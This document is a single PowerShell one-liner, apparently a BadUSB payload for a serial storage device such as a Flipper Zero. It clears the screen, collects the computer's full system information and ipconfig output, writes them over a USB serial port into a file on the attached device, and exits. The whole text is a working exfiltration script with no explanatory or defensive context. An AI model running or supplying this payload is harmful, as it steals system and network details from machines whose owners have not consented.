cls;Start-Sleep -Seconds 5;$IPCONF=ipconfig;$COMPORT=(Get-WmiObject Win32_SerialPort | Where-Object { $_.Description -eq "USB Serial Device" }).DeviceID;$SPATH="/ext/rombluc_ext/$env:COMPUTERNAME-$(Get-Random).txt";$p=New-Object System.IO.Ports.SerialPort($COMPORT);try {$p.open()} catch {cls; Write-Host "Port $COMPORT is occupied! Exiting in 3 seconds.."; Start-Sleep -Seconds 3; exit;};$p.Write("storage write $SPATH `r`n");$p.Write((Get-ComputerInfo|Out-String));$p.Write($IPCONF);$p.Write("$([char] 3)");$p.Close();exit;
